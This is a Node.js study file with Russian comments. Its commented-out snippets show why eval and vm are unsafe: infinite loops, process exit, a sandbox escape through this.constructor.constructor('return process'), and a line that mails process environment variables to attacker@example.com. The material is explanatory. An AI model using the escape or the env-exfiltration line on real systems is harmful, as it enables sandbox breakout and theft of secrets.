const vm = require('vm')
/* 
eval к которому можно прибивать контекст
Не секьюрно
*/

/*  
eval('while(true) console.log(1)')
console.log('The application goes on...')
*/

/* 
eval('process.exit(0)')
console.log('The application goes on...')
*/

/* 
eval('require("node-mailer").mail("attacker@example.com", JSON.stringify(process.ENV))')
console.log('The application goes on...')
*/

/* 
eval('eval = undefined')
console.log('The application goes on...')
*/

/* 
const a = new Array(2)
console.log(a)
vm.runInNewContext(
  `const a = new Array(2);console.log(a);Array = null
  // const b = new Array(2)
  `,
  { Array, console }
)
const b = new Array(2)
console.log(b)
*/

/* 
vm.runInThisContext('process.exit(0)')
console.log("alo")
*/

/*
 vm.runInNewContext('process.exit(0)') // error
console.log('alo') 
*/

/* vm.runInNewContext(
  "this.constructor.constructor('return process')().exit()"
)
console.log('The app goes on...')
*/

/* 
let obj = Object.create(null)
obj.a = 1
vm.runInNewContext(
  "this.constructor.constructor('return process')().exit()",
  obj
) //error
*/


/* vm.runInNewContext(
  'let i = 0;while(true){console.log(i++)}',
  { console },
  { timeout: 500 }
)
*/


/* 
Links:
https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/
https://node.readthedocs.io/en/latest/api/vm/
*/